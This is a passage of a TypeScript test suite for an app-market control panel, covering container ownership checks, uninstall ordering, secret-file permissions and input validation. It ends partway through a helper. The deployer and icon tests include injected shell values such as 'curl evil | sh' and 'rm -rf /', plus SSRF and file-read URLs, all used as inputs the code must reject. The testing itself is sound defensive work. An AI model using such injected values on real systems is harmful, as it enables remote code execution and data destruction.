/**
 * Plan 4 stage C: installed-app records, ownership tags and the Market security fixes.
 */
import assert from 'node:assert/strict';
import { mkdir, mkdtemp, rm, stat, writeFile, chmod, readdir } from 'node:fs/promises';
import { readFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import test from 'node:test';
import vm from 'node:vm';
import { createRequire } from 'node:module';
import ts from 'typescript';
import { appSecretNameFromFile, appSecretStoreAt, appSecretFile } from '../src/lib/infrastructure/secrets';
import { assertContainerNamesAvailable } from '../src/lib/market/instance-ownership';
import { getContainerName, leftoverAppPaths } from '../src/lib/market/engine-helpers';
import { caddyTrustAppDirectory, removeCaddyTrustBundle } from '../src/lib/market/caddy-ca';
import { marketIconPicture, resolveAppIcon } from '../src/lib/market/app-icon';
import type { InstallMetadata } from '../src/lib/market/types';
import { routeServers } from '../src/lib/caddy/servers';
import * as marketSource from '../src/lib/market/source';
import { freeLifecycle } from './fixtures/free-lifecycle';

const require = createRequire(import.meta.url);
const root = process.env.CONTROL_PANEL_ROOT || path.join(import.meta.dirname, '..');
const INSTALLATION = '20000000-0000-4000-8000-000000000001';
const FOREIGN = '20000000-0000-4000-8000-000000000002';

/** Load a source module in a sandbox with every import mocked (unmocked imports throw on use). */
function loadModule(file: string, mocks: Record<string, unknown>, globals: Record<string, unknown> = {}) {
  const exports: Record<string, any> = {};
  const module = { exports };
  vm.runInNewContext(ts.transpileModule(readFileSync(path.join(root, 'src', file), 'utf8'), {
    compilerOptions: { module: ts.ModuleKind.CommonJS, target: ts.ScriptTarget.ES2022, esModuleInterop: true },
  }).outputText, { exports, module, console, URL, Buffer, setTimeout, ...globals, require(name: string) {
    if (name in mocks) return mocks[name];
    if (name.startsWith('node:') || ['path', 'crypto'].includes(name)) return require(name);
    return new Proxy({}, { get: (_target, property) => {
      if (property === '__esModule') return true;
      return () => { throw Error(`Unexpected effect: ${name}.${String(property)}`); };
    } });
  } });
  return module.exports;
}

/** A fake Incus holding `instances` (name → config); records every mutating request. */
function fakeIncus(instances: Record<string, Record<string, string>>) {
  const effects: Array<{ method: string; route: string }> = [];
  const incusRequest = async (method: string, route: string) => {
    const name = decodeURIComponent(route.split('/')[3] ?? '');
    if (method === 'GET') {
      if (!(name in instances)) return { type: 'error', error_code: 404, error: 'not found' };
      return { type: 'sync', status_code: 200, metadata: { name, status: 'Running', config: instances[name] } };
    }
    effects.push({ method, route });
    if (method === 'DELETE') delete instances[name];
    return { type: 'sync' };
  };
  return { effects, incusRequest };
}

function ownershipModule(incusRequest: unknown) {
  return loadModule('lib/market/instance-ownership.ts', { '../incus/server': { incusRequest } });
}

const tags = (appId: string, installationId: string) => ({
  'user.youeye.app_id': appId, 'user.youeye.installation_id': installationId,
});

// ─── Ownership tags ─────────────────────────────────────────

test('a foreign same-name container is refused by the OCI deployer and never deleted', async () => {
  for (const config of [{}, tags('mealie', FOREIGN)]) {
    const incus = fakeIncus({ 'app-mealie': config });
    const deployer = loadModule('lib/infrastructure/oci-deployer.ts', {
      '../incus/server': { incusRequest: incus.incusRequest },
      '../incus/static-ips': { applyStaticIP: async () => {} },
      '../market/instance-ownership': ownershipModule(incus.incusRequest),
    });
    const manifest = { name: 'mealie', displayName: 'app-mealie', containerName: 'app-mealie', image: 'ghcr.io/x/y@sha256:' + 'a'.repeat(64),
      ports: [], environment: {}, volumes: [] };
    await assert.rejects(deployer.deployOCIContainer(manifest, '', undefined,
      { owner: { appId: 'mealie', installationId: INSTALLATION } }), /already exists; refusing to replace it/);
    assert.deepEqual(incus.effects, []);
  }
});

test('the OCI deployer never replaces a non-platform instance even without an owner', async () => {
  const incus = fakeIncus({ 'app-other': {} });
  const deployer = loadModule('lib/infrastructure/oci-deployer.ts', {
    '../incus/server': { incusRequest: incus.incusRequest },
    '../incus/static-ips': { applyStaticIP: async () => {} },
    '../market/instance-ownership': ownershipModule(incus.incusRequest),
  });
  await assert.rejects(deployer.deployOCIContainer({ name: 'x', displayName: 'x', containerName: 'app-other', image: 'x/y',
    ports: [], environment: {}, volumes: [] }, ''), /refusing to replace it/);
  assert.deepEqual(incus.effects, []);
});

test('preflight refuses any target name Incus already holds', async () => {
  const incus = fakeIncus({ 'app-mealie': tags('mealie', FOREIGN) });
  const ownership = ownershipModule(incus.incusRequest);
  await assert.rejects(ownership.assertInstancesAbsent(['app-mealie']), /already exists and does not belong to this install/);
  await ownership.assertInstancesAbsent(['app-other']);
  assert.deepEqual(incus.effects, []);
});

test('cleanup deletes only an exact name tagged with this installation', async () => {
  const incus = fakeIncus({
    'app-foo': tags('foo', INSTALLATION),
    'app-foo-bar': tags('foo-bar', FOREIGN),
    'app-untagged': {},
  });
  const ownership = ownershipModule(incus.incusRequest);
  const owner = { appId: 'foo', installationId: INSTALLATION };
  await assert.rejects(ownership.deleteOwnedInstance('app-foo-bar', owner), /not tagged with this installation/);
  await assert.rejects(ownership.deleteOwnedInstance('app-untagged', owner), /not tagged with this installation/);
  await assert.rejects(ownership.deleteOwnedInstance('app-foo', undefined), /not tagged with this installation/);
  assert.deepEqual(incus.effects, []);
  assert.equal(await ownership.deleteOwnedInstance('app-foo', owner), 'deleted');
  assert.equal(await ownership.deleteOwnedInstance('app-foo', owner), 'absent');
  assert.deepEqual(incus.effects.map((effect) => effect.route), ['/1.0/instances/app-foo/state', '/1.0/instances/app-foo']);
});

test('a stopped (never started) owned instance is still deleted', async () => {
  const incus = fakeIncus({ 'app-foo': tags('foo', INSTALLATION) });
  const request = async (method: string, route: string) => method === 'PUT'
    ? { type: 'error', error: 'The instance is already stopped' }
    : incus.incusRequest(method, route);
  const ownership = ownershipModule(request);
  assert.equal(await ownership.deleteOwnedInstance('app-foo', { appId: 'foo', installationId: INSTALLATION }), 'deleted');
});

// ─── Container names ────────────────────────────────────────

const record = (appId: string, containers: string[]): InstallMetadata => ({
  appId, integration: 'basic', subdomain: appId, domain: 'example.test', enableSSO: false,
  installedAt: '2026-11-12T00:00:00Z',
  containers: containers.map((containerName) => ({ name: 'main', containerName, type: 'oci' as const })),
});

test('colliding container names are refused in either install order', () => {
  // app `foo` with sidecar `bar` and app `foo-bar` both want `app-foo-bar`.
  const fooNames = ['main', 'bar'].map((name) => getContainerName('foo', name, 2));
  assert.deepEqual(fooNames, ['app-foo-main', 'app-foo-bar']);
  assert.throws(() => assertContainerNamesAvailable('foo', fooNames, [record('foo-bar', ['app-foo-bar'])]),
    /already used by installed app foo-bar/);
  assert.throws(() => assertContainerNamesAvailable('foo-bar', [getContainerName('foo-bar', 'main', 1)],
    [record('foo', fooNames)]), /already used by installed app foo/);
  // A retained (keep-data) app's names are reserved as well; the app's own record is not a collision.
  const retained = { ...record('foo-bar', []), retainedRoots: { schemaVersion: 1 as const, state: 'ready' as const,
    roots: [{ sourceName: 'app-foo-bar', retainedName: 'ye-retained-1', ownerId: INSTALLATION, pool: 'default' }] } };
  assert.throws(() => assertContainerNamesAvailable('foo', fooNames, [retained]), /foo-bar/);
  assertContainerNamesAvailable('foo', fooNames, [record('foo', fooNames), record('other', ['app-other'])]);
  assert.throws(() => assertContainerNamesAvailable('foo', ['app-foo', 'app-foo'], []), /used twice/);
  assert.throws(() => assertContainerNamesAvailable('x', [`app-${'a'.repeat(32)}-${'b'.repeat(30)}`], []), /1–63 chars/);
});

// ─── Uninstall: siblings, CA directory, cleanup_pending ─────

function uninstallFixture(options: {
  failStorage?: boolean; sharedDatabaseCreated?: boolean;
  /** The app's connections; `unwireFails` makes their remove: steps fail. */
  bridges?: { id: string; from: string; to: string }[]; unwireFails?: boolean;
  /** YE-209: the credential revocation, a connection's deletion, or the refusal checks fail. */
  revokeFails?: boolean; deleteBridgeFails?: boolean; refused?: boolean;
  /** YE-222: the app's data is kept (the shared refusal answers). */
  kept?: string;
} = {}) {
  const incus = fakeIncus({
    'app-foo': tags('foo', INSTALLATION),
    'app-foo-bar': tags('foo-bar', FOREIGN),
  });
  let metadata: any = {
    ...record('foo', ['app-foo']), installationId: INSTALLATION, databaseMode: 'shared',
    databaseName: 'foo', databaseUser: 'foo', storageVolumes: [],
    ...(options.sharedDatabaseCreated === false ? {} : { sharedDatabaseCreated: true }),
  };
  const saved: any[] = [];
  const removedRoutes: string[] = [];
  const calls: string[] = [];
  let lease: unknown = { bridgeName: 'yeapp1', state: 'active' };
  const routes = [
    { id: 'route-1', hostname: 'foo.example.test', upstream: '10.0.0.2' },
    { id: 'app-foo-bar-web', hostname: 'foo-bar.example.test', upstream: 'app-foo-bar' },
  ];
  const sql: string[][] = [];
  let bridges = structuredClone(options.bridges ?? []);
  const uninstaller = loadModule('lib/market/uninstaller.ts', {
    '../incus/server': { execCommand: async (_container: string, args: string[]) => { sql.push(args); return { exitCode: 0, stdout: '' }; } },
    '../infrastructure/oci-deployer': { containerExists: async (name: string) => name === 'app-foo-bar'
      // With connections, foo runs until its container is deleted (so the uninstall stops it first).
      || (options.bridges !== undefined && name === 'app-foo'
        && !incus.effects.some((effect) => effect.method === 'DELETE' && effect.route === '/1.0/instances/app-foo')) },
    '../caddy/client': {
      getRoutes: async () => routes.filter((route) => !removedRoutes.includes(route.id)),
      removeRoute: async (id: string) => { removedRoutes.push(id); },
    },
    './metadata': {
      readInstallMetadata: async () => metadata,
      saveInstallMetadata: async (value: unknown) => { saved.push(structuredClone(value)); },
      removeInstallMetadata: async () => { calls.push('remove-metadata'); metadata = null; },
      removeInstallMetadataRecord: async () => { metadata = null; },
    },
    './installed-apps': { removeInstalledApp: async () => {}, getInstalledApp: async () => null },
    '@/lib/identity/provider': { removeForwardAuth: async () => {}, removeOAuthClient: async () => {} },
    './reconciler': { isAppRegisteredWithUI: async () => false, cleanupAppByScan: async () => ({ repaired: [], unresolved: [] }),
      keptDataRefusal: async () => options.kept ?? null },
    './install-tracker': { describeErrorChainForLog: (error: unknown) => String(error) },
    '../incus/app-network': {
      withAppNetworkOperationLock: async (_id: string, _op: string, fn: () => unknown) => fn(),
      removeSystemProxyDevices: async () => {}, removeCaddyFromAppNetwork: async () => {},
      deleteAppNetwork: async () => { lease = null; }, getAppNetworkLease: async () => lease,
      markAppNetworkCleanupPending: async () => { calls.push('lease-cleanup-pending'); },
      removalStage: (stage: string, keepData: boolean) => `${stage}-${keepData ? 'keep-data' : 'delete-data'}`,
      recordRemovalMode: async (_appId: string, keepData: boolean) => { calls.push(`mode:${keepData ? 'keep' : 'delete'}`); },
      withRemovalRequest: async (_appId: string, work: () => unknown) => work(),
    },
    '@/lib/pointer/managed-apps': {},
    '@/lib/infrastructure/secrets': {
      deleteAllAppSecrets: async (appId: string) => { calls.push(`secrets:${appId}`); },
      readAppSecret: async () => null,
    },
    './caddy-ca': { removeCaddyTrustBundle: async (appId: string) => { calls.push(`ca:${appId}`); } },
    './instance-ownership': ownershipModule(incus.incusRequest),
    './restored-managed-ai': {},
    './storage': {
      deleteAppStorage: async () => { if (options.failStorage) throw Error('volume busy'); calls.push('storage'); },
      verifyAppStorageRemoval: async () => !options.failStorage,
    },
    './update-admission': { withAppInventory: async (fn: () => unknown) => fn(),
      withAppLifecycle: async (_id: string, fn: () => unknown) => fn() },
    '../apps/service-credential-bridge': { revokeAppCredential: async () => {
      calls.push('revoke');
      if (options.revokeFails) throw Error('YouEye ID unreachable');
    } },
    '../apps/service-credential-probe': { quiesceAppCredentialRuntime: async () => { calls.push(`stop:${incus.effects.length}`); } },
    '@/lib/admission/retained-data': { cleanupAdoptedRetainedCopies: async () => false },
    '@/lib/admission/lifecycle': {
      verifyAdmissionCleanup: async () => { if (options.refused) throw Error('admission cleanup refused'); },
      retainAdmissionOnUninstall: async () => {},
    },
    '../bridges/manager': {
      getBridgesForApp: async () => structuredClone(bridges),
      // The real one runs every connection's remove: steps and never throws (bridges/manager.ts).
      unwireAppConnections: async (appId: string) => {
        calls.push(`unwire:${appId}:${incus.effects.length}`);
        return options.unwireFails
          ? bridges.map((bridge) => ({ appId: bridge.to, name: 'Sonarr',
            message: `Could not unwire ${bridge.from} → ${bridge.to}: the remove steps of this connection did not run` }))
          : [];
      },
      deleteBridge: async (id: string, deleteOptions: { unwired?: boolean } = {}) => {
        calls.push(`delete-bridge:${id}:${deleteOptions.unwired === true ? 'unwired' : 'unwire-again'}:${incus.effects.length}`);
        if (options.deleteBridgeFails) throw Error('integration ACL delete failed');
        bridges = bridges.filter((bridge) => bridge.id !== id);
        return true;
      },
      // The real one marks the app's remaining active network connections rewirePending (bridges/manager.ts).
      markConnectionsForRewire: async (appId: string) => {
        calls.push(`mark-rewire:${appId}:${bridges.map((bridge) => bridge.id).join(',')}`);
        return bridges.map((bridge) => bridge.id);
      },
    },
    '../apps/pihole-api': { getCNAMERecords: async () => [], getDNSRecords: async () => [] },
    '../incus/container-ip': { getContainerIP: async () => '192.0.2.1' },
    '@/lib/identity/store': { getClient: async () => null },
    fs: { readFileSync: () => { throw Error('No fixture token file'); } },
  }, { process: { env: { UI_BRIDGE_TOKEN: 'fixture-only' } }, fetch: async () => ({ ok: true, status: 200 }) });
  return { uninstaller, incus, calls, saved, sql, removedRoutes, metadata: () => metadata };
}

test('uninstalling foo never touches foo-bar and removes its database, secrets and CA directory', async () => {
  const f = uninstallFixture();
  const result = await f.uninstaller.uninstallApp('foo', { keepData: false });
  assert.equal(result.success, true, result.errors.join('; '));
  assert.deepEqual(f.incus.effects.map((effect) => effect.route), ['/1.0/instances/app-foo/state', '/1.0/instances/app-foo']);
  assert.deepEqual(f.removedRoutes, ['route-1']);
  assert.ok(f.calls.includes('ca:foo'));
  assert.ok(f.calls.includes('secrets:foo'));
  assert.ok(f.calls.includes('remove-metadata'));
  assert.ok(f.sql.some((args) => args.includes('DROP DATABASE IF EXISTS "foo" WITH (FORCE)')));
  assert.ok(f.sql.some((args) => args.includes('DROP ROLE IF EXISTS "foo"')));
  assert.equal(f.metadata(), null);
});

test('uninstall runs the connections\' remove: steps while the app still runs, before any deletion (YE-199)', async () => {
  // SABnzbd as the consumer (its connect file removes its download client from Sonarr) and as the app another one
  // connects to: both connections are undone before the app is stopped and before its containers or secrets go.
  const f = uninstallFixture({ bridges: [
    { id: 'foo-to-sonarr', from: 'foo', to: 'sonarr' },
    { id: 'lidarr-to-foo', from: 'lidarr', to: 'foo' },
  ] });
  const result = await f.uninstaller.uninstallApp('foo', { keepData: false });
  assert.equal(result.success, true, result.errors.join('; '));
  assert.deepEqual([...result.warnings], []);
  assert.deepEqual([...result.connectionsLeft], []);
  const order = f.calls.filter((call) => /^(unwire|stop|delete-bridge|secrets)/.test(call));
  assert.deepEqual(order, [
    'unwire:foo:0',
    'stop:0',
    // The steps already ran: deleting the connections does not run them again against the stopped app.
    'delete-bridge:foo-to-sonarr:unwired:0',
    'delete-bridge:lidarr-to-foo:unwired:0',
    'secrets:foo',
  ]);
  assert.ok(f.incus.effects.length > 0, 'the containers were deleted after the connections');
});

test('a failing remove: step never blocks the uninstall: it is reported in warnings (YE-199)', async () => {
  const f = uninstallFixture({ bridges: [{ id: 'foo-to-sonarr', from: 'foo', to: 'sonarr' }], unwireFails: true });
  const result = await f.uninstaller.uninstallApp('foo', { keepData: false });
  assert.equal(result.success, true, result.errors.join('; '));
  assert.deepEqual([...result.errors], []);
  assert.deepEqual([...result.warnings], ['Could not unwire foo → sonarr: the remove steps of this connection did not run']);
  // The Control Panel names the app that may still list foo.
  assert.deepEqual(JSON.parse(JSON.stringify(result.connectionsLeft)), [{ appId: 'sonarr', name: 'Sonarr' }]);
  assert.ok(f.calls.includes('delete-bridge:foo-to-sonarr:unwired:0'), 'the connection is still deleted');
  assert.ok(f.calls.includes('remove-metadata'));
  assert.equal(f.metadata(), null);
});

test('a revocation that fails after the remove: steps ran marks the connections for re-wiring (YE-209)', async () => {
  const f = uninstallFixture({ bridges: [
    { id: 'foo-to-sonarr', from: 'foo', to: 'sonarr' },
    { id: 'lidarr-to-foo', from: 'lidarr', to: 'foo' },
  ], revokeFails: true });
  await assert.rejects(f.uninstaller.uninstallApp('foo', { keepData: false }), /YouEye ID unreachable/);
  const order = f.calls.filter((call) => /^(unwire|stop|revoke|mark-rewire|delete-bridge|secrets)/.test(call));
  // The app stays installed (stopped) with both connections, which are marked so its next start wires them again.
  assert.deepEqual(order, ['unwire:foo:0', 'stop:0', 'revoke', 'mark-rewire:foo:foo-to-sonarr,lidarr-to-foo']);
  assert.ok(f.metadata(), 'install.json stays');
  assert.equal(f.saved.at(-1).enabled, false);
  assert.equal(f.incus.effects.length, 0, 'nothing was deleted');
});

test('a removal that stops after the revocation leaves the record pending: what YE-225 recognises', async () => {
  // The revocation's publication fails (the dashboard down): the store's credential is already revoked by then.
  const publication = uninstallFixture({ bridges: [{ id: 'foo-to-sonarr', from: 'foo', to: 'sonarr' }], revokeFails: true });
  await assert.rejects(publication.uninstaller.uninstallApp('foo', { keepData: false }), /YouEye ID unreachable/);
  assert.ok(publication.calls.includes('revoke'));
  assert.equal(publication.metadata().serviceCredentialState, 'pending');
  // A later step fails (a connection that can't be deleted): the record stays, pending, after the revocation.
  const later = uninstallFixture({ bridges: [{ id: 'foo-to-sonarr', from: 'foo', to: 'sonarr' }], deleteBridgeFails: true });
  const result = await later.uninstaller.uninstallApp('foo', { keepData: false });
  assert.equal(result.success, false);
  assert.ok(later.calls.includes('revoke'));
  assert.equal(later.metadata()?.serviceCredentialState, 'pending');
});

test('an uninstall that returns with errors after the remove: steps ran marks the connections left (YE-209)', async () => {
  const f = uninstallFixture({ bridges: [{ id: 'foo-to-sonarr', from: 'foo', to: 'sonarr' }], deleteBridgeFails: true });
  const result = await f.uninstaller.uninstallApp('foo', { keepData: false });
  assert.equal(result.success, false);
  assert.ok(result.errors.includes('Explicit integration cleanup or verification failed'));
  assert.ok(f.calls.includes('mark-rewire:foo:foo-to-sonarr'));
});

test('a complete uninstall, or one refused before the remove: steps, marks nothing (YE-209)', async () => {
  const done = uninstallFixture({ bridges: [{ id: 'foo-to-sonarr', from: 'foo', to: 'sonarr' }] });
  assert.equal((await done.uninstaller.uninstallApp('foo', { keepData: false })).success, true);
  assert.ok(!done.calls.some((call) => call.startsWith('mark-rewire')));
  const refused = uninstallFixture({ bridges: [{ id: 'foo-to-sonarr', from: 'foo', to: 'sonarr' }], refused: true });
  await assert.rejects(refused.uninstaller.uninstallApp('foo', { keepData: false }), /admission cleanup refused/);
  assert.ok(!refused.calls.some((call) => /^(unwire|mark-rewire)/.test(call)), 'nothing was unwired, nothing to mark');
});

test('install rollback and forced removal delete the connections before the containers (YE-199)', () => {
  const engine = readFileSync(path.join(root, 'src/lib/market/engine.ts'), 'utf8');
  const rollback = engine.slice(engine.indexOf('async function rollbackInstall('));
  const bridgesGo = rollback.indexOf('await deleteBridge(bridge.id)');
  assert.ok(bridgesGo > 0 && bridgesGo < rollback.indexOf('await deleteOwnedInstance(name')
    && bridgesGo < rollback.indexOf('await deleteAllAppSecrets(ctx.appId)'));
  const reconciler = readFileSync(path.join(root, 'src/lib/market/reconciler.ts'), 'utf8');
  const scan = reconciler.slice(reconciler.indexOf('async function cleanupAppByScanUnderLifecycle('));
  const scanBridgesGo = scan.indexOf('await deleteBridge(bridge.id)');
  assert.ok(scanBridgesGo > 0 && scanBridgesGo < scan.indexOf('await deleteOwnedInstance(name, owner)'));
});

test('delete-data never drops a shared database this installation did not create', async () => {
  const f = uninstallFixture({ sharedDatabaseCreated: false });
  const result = await f.uninstaller.uninstallApp('foo', { keepData: false });
  assert.equal(result.success, true, result.errors.join('; '));
  assert.ok(f.calls.includes('secrets:foo'));
  assert.ok(!f.sql.some((args) => args.some((arg) => /DROP (DATABASE|ROLE)/.test(arg))), 'no DROP statement ran');
  assert.equal(f.metadata(), null);
});

test('the install record marks the shared database as created only after creation succeeded', () => {
  const engine = readFileSync(path.join(root, 'src/lib/market/engine.ts'), 'utf8');
  const create = engine.indexOf('await setupSharedPostgres(dbName, dbUser, dbPassword, rollbackCtx);');
  const mark = engine.indexOf('created.sharedDatabaseCreated = true;');
  assert.ok(create > 0 && mark > create, 'the flag is written after setupSharedPostgres returns');
  assert.match(engine, /sharedDatabaseCreated: manifest\.database\?\.mode === 'shared' && restoreOptions\?\.sharedDatabaseCreated \? true : undefined/);
  const reconciler = readFileSync(path.join(root, 'src/lib/market/reconciler.ts'), 'utf8');
  assert.match(reconciler, /databaseMode === 'shared' && recoveryMetadata\.sharedDatabaseCreated === true/);
});

test('order B: a delete-data retry after a keep-data removal started is refused before anything changes (YE-222)', async () => {
  // A keep-data attempt failed partway (retained policy, retained.json); a plain remove (delete-data) follows.
  const f = uninstallFixture({ kept: 'ownership:foo:its data is kept (a removal with keep-data started or finished), and kept data is never deleted this way. Finish that removal with youeye app remove foo --keep-data' });
  await assert.rejects(f.uninstaller.uninstallApp('foo', { keepData: false }), /foo: its data is kept .* youeye app remove foo --keep-data/);
  assert.deepEqual(f.calls, [], 'no revocation, no mode change, nothing deleted');
  assert.equal(f.saved.length, 0, 'the record is not even rewritten');
  assert.deepEqual(f.incus.effects, []);
  // A keep-data request is not refused by it: that request is what finishes a stopped keep-data removal.
  const source = readFileSync(path.join(root, 'src/lib/market/uninstaller.ts'), 'utf8');
  assert.match(source, /if \(!keepData && !options\.preserveAdmission\) \{\s*const kept = await keptDataRefusal\(appId\);/);
});

test('a removal records its own mode on the lease before anything changes (YE-222)', async () => {
  const f = uninstallFixture({ failStorage: true });
  await f.uninstaller.uninstallApp('foo', { keepData: false });
  assert.equal(f.calls[0], 'mode:delete', 'first, before any effect');
});

test('a failed deletion keeps install.json with cleanupPending for the next retry', async () => {
  const f = uninstallFixture({ failStorage: true });
  const result = await f.uninstaller.uninstallApp('foo', { keepData: false });
  assert.equal(result.success, false);
  assert.ok(f.metadata(), 'install.json stays as the recovery map');
  assert.equal(f.saved.at(-1).cleanupPending, true);
  assert.ok(f.calls.includes('lease-cleanup-pending'));
  assert.ok(!f.calls.includes('remove-metadata'));
});

test('the generated CA directory is removed so a reinstall passes preflight', async () => {
  const base = await mkdtemp(path.join(tmpdir(), 'youeye-ca-'));
  try {
    const trust = path.join(caddyTrustAppDirectory('mealie', base), 'trust');
    await mkdir(trust, { recursive: true });
    await writeFile(path.join(trust, 'ca-bundle.crt'), 'bundle');
    assert.deepEqual(leftoverAppPaths('mealie', base), [path.join(base, 'apps', 'mealie')]);
    await removeCaddyTrustBundle('mealie', base);
    assert.deepEqual(leftoverAppPaths('mealie', base), []);
    await removeCaddyTrustBundle('mealie', base); // absent is clean
    assert.throws(() => caddyTrustAppDirectory('../etc'), /Invalid app ID/);
    // An empty app directory (left by a keep-data cleanup of a failed install) holds no data: no block.
    await mkdir(path.join(base, 'app-wikiless'));
    assert.deepEqual(leftoverAppPaths('wikiless', base), []);
    await writeFile(path.join(base, 'app-wikiless', 'install.json'), '{}');
    assert.deepEqual(leftoverAppPaths('wikiless', base), [path.join(base, 'app-wikiless')]);
  } finally {
    await rm(base, { recursive: true, force: true });
  }
});

// ─── Secrets ────────────────────────────────────────────────

test('secret names and paths cannot escape the app secret directory', async () => {
  const base = await mkdtemp(path.join(tmpdir(), 'youeye-secrets-'));
  try {
    const store = appSecretStoreAt(base);
    for (const name of ['../escape', '..', 'install.json', 'a/b', '.db_password', 'UPPER', '', 'x'.repeat(41)]) {
      await assert.rejects(store.write('mealie', name, 'value'), /Invalid app secret name/);
      await assert.rejects(store.read('mealie', name), /Invalid app secret name/);
    }
    await assert.rejects(store.write('../etc', 'db_password', 'value'), /Invalid app ID/);
    assert.equal(store.path('mealie', 'db_password'), path.join(base, 'app-mealie', 'secrets', 'db_password'));
    assert.equal(appSecretFile('db_password'), 'secrets/db_password');
    assert.equal(appSecretNameFromFile('secrets/db_password'), 'db_password');
    for (const file of ['secrets/../install.json', 'install.json', '.db_password', 'secrets/a/b']) {
      assert.throws(() => appSecretNameFromFile(file), /outside the app-owned secret directory/);
    }
    // install.json next to the secrets directory is never readable as a secret.
    await mkdir(path.join(base, 'app-mealie'), { recursive: true });
    await writeFile(path.join(base, 'app-mealie', 'install.json'), '{}');
    assert.equal(await store.read('mealie', 'install'), null);
  } finally {
    await rm(base, { recursive: true, force: true });
  }
});

test('the app secret directory is 0700 and secret files are 0600', async () => {
  const base = await mkdtemp(path.join(tmpdir(), 'youeye-secrets-'));
  try {
    const store = appSecretStoreAt(base);
    // A world-writable directory is tightened on the next write.
    await mkdir(path.join(base, 'app-mealie', 'secrets'), { recursive: true });
    await chmod(path.join(base, 'app-mealie', 'secrets'), 0o777);
    await store.write('mealie', 'db_password', 'first');
    assert.equal((await stat(path.join(base, 'app-mealie', 'secrets'))).mode & 0o777, 0o700);
    assert.equal((await stat(store.path('mealie', 'db_password'))).mode & 0o777, 0o600);
    assert.equal(await store.getOrCreate('mealie', 'db_password', () => 'second'), 'first');
    assert.equal(await store.getOrCreate('mealie', 'api_key', () => 'generated'), 'generated');
    assert.equal((await stat(store.path('mealie', 'api_key'))).mode & 0o777, 0o600);
    assert.deepEqual((await readdir(path.join(base, 'app-mealie', 'secrets'))).sort(), ['api_key', 'db_password']);
    await store.removeAll('mealie');
    assert.equal(await store.read('mealie', 'db_password'), null);
  } finally {
    await rm(base, { recursive: true, force: true });
  }
});

test('the platform secret writer never creates world-writable directories', () => {
  const source = readFileSync(path.join(root, 'src/lib/infrastructure/secrets.ts'), 'utf8');
  assert.doesNotMatch(source, /chmod\([^)]*0o777|mode: 0o777/);
  const engine = readFileSync(path.join(root, 'src/lib/market/engine.ts'), 'utf8');
  assert.doesNotMatch(engine, /\/var\/lib\/youeye\/secrets\//);
});

// ─── Native deployer boundary ───────────────────────────────

test('a bad Node version or app directory is refused at the native deployer before Incus', async () => {
  const incus = fakeIncus({});
  const deployer = loadModule('lib/infrastructure/lxd-deployer.ts', {
    '../incus/server': { incusRequest: incus.incusRequest },
    '../incus/static-ips': { applyStaticIP: async () => {} },
    './oci-deployer': { containerExists: async () => false },
    '@/lib/market/instance-ownership': ownershipModule(incus.incusRequest),
  });
  const spec = { name: 'notes', displayName: 'Notes', containerName: 'app-notes', image: 'debian/13',
    imageServer: 'https://images.linuxcontainers.org', imageProtocol: 'simplestreams',
    nodeVersion: '22.x', appDir: '/opt/app', port: 3000 };
  deployer.assertMarketNativeSpec(spec);
  const bad = [
    { nodeVersion: '22.x; curl evil | sh' }, { nodeVersion: '18.x' }, { nodeVersion: '22' },
    { appDir: '/opt/app; rm -rf /' }, { appDir: 'app' }, { appDir: '/srv/app' },
    { postInstallCommands: ['id'] }, { entryFile: '../x.js' }, { runtime: 'bun' },
    { displayName: 'Notes\nExecStartPre=/bin/sh' }, { containerName: 'app_notes' },
  ];
  for (const change of bad) {
    assert.throws(() => deployer.assertMarketNativeSpec({ ...spec, ...change }));
    await assert.rejects(deployer.deployMarketLXDContainer({ ...spec, ...change }, {}, undefined,
      { appId: 'notes', installationId: INSTALLATION }));
  }
  assert.deepEqual(incus.effects, []);
});

// ─── Icons ──────────────────────────────────────────────────

test('app icons come only from a picture of the market the app installs from, never a URL', async () => {
  const reads: string[] = [];
  const read = async (sourceId: string, file: string) => { reads.push(`${sourceId} ${file}`); return Buffer.from('<svg/>'); };
  const picture = `h/files/${'a'.repeat(64)}.svg`;
  const named = `/api/market/image?source=official&file=${encodeURIComponent(picture)}`;
  const base = { appId: 'mealie', lucide: 'utensils', sourceId: 'official' };
  for (const iconUrl of [
    'https://169.254.169.254/latest/meta-data',
    'http://youeye-postgres.youeye:5432/x.png',
    '/api/market/image?url=https%3A%2F%2Fraw.githubusercontent.com%2Fx%2Fy%2Fmain%2Ficon.png',
    '/api/market/image?catalog=apps%2Fmealie%2Ficon.svg',
    // Another source than the one the app installs from, and paths that are not a market picture.
    `/api/market/image?source=custom-1&file=${encodeURIComponent(picture)}`,
    '/api/market/image?source=official&file=apps%2Fmealie%2Ficon.svg',
    `/api/market/image?source=official&file=${encodeURIComponent(`h/files/../apps/x/${'a'.repeat(64)}.json`)}`,
    `/api/market/image?source=official&file=${encodeURIComponent(`h/files/${'a'.repeat(64)}.html`)}`,
    `/api/market/image?source=official&file=${encodeURIComponent(`https://evil.example.org/${picture}`)}`,
  ]) {
    assert.equal(await resolveAppIcon({ ...base, iconUrl }, read), 'utensils', iconUrl);
  }
  for (const customIcon of ['https://example.com/x.png', 'http://10.0.0.1/', 'file:///etc/passwd']) {
    assert.equal(await resolveAppIcon({ ...base, customIcon }, read), 'utensils');
  }
  // An app added by URL has no market: its icon is never read from one.
  assert.equal(await resolveAppIcon({ ...base, iconUrl: named, sourceId: 'direct:abc' }, read), 'utensils');
  assert.equal(await resolveAppIcon({ ...base, iconUrl: named, sourceId: undefined }, read), 'utensils');
  assert.deepEqual(reads, []);
  assert.equal(marketIconPicture({ iconUrl: named, sourceId: undefined }), null);
  assert.equal(await resolveAppIcon({ ...base, iconUrl: named }, read),
    `data:image/svg+xml;base64,${Buffer.from('<svg/>').toString('base64')}`);
  assert.deepEqual(reads, [`official ${picture}`]);
  // A picture the market does not name (the reader answers null), an oversized one and a failed read fall back.
  assert.equal(await resolveAppIcon({ ...base, iconUrl: named }, async () => null), 'utensils');
  assert.equal(await resolveAppIcon({ ...base, iconUrl: named }, async () => Buffer.alloc(512 * 1024 + 1)), 'utensils');
  assert.equal(await resolveAppIcon({ ...base, iconUrl: named }, async () => { throw new Error('offline'); }), 'utensils');
  assert.equal(await resolveAppIcon({ ...base, customIcon: 'book' }, read), 'book');
  const engine = readFileSync(path.join(root, 'src/lib/market/engine.ts'), 'utf8');
  assert.doesNotMatch(engine, /fetchIconAsDataUri|https\.request/);
});

// ─── Setup files need an explicit approval for URL installs ──

function routeModule(file: string, setups: Array<{ name: string; for: string }>) {
  const started: string[] = [];
  const configs: Array<Record<string, unknown>> = [];
